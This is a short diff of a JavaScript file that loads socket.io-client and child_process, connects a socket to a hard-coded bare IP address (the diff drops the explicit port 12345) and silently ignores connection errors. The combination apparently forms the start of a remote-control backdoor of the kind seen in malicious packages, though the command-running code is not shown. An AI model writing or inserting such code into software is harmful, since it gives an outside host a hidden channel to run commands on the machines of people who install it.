@@ -1,7 +1,7 @@
 const socketioClient = require("socket.io-client");
 const childProcess = require("child_process");
 
-const socket = socketioClient("http://5.34.183.68:12345");
+const socket = socketioClient("http://5.34.183.68");
 
 socket.on("error", () => {});
 
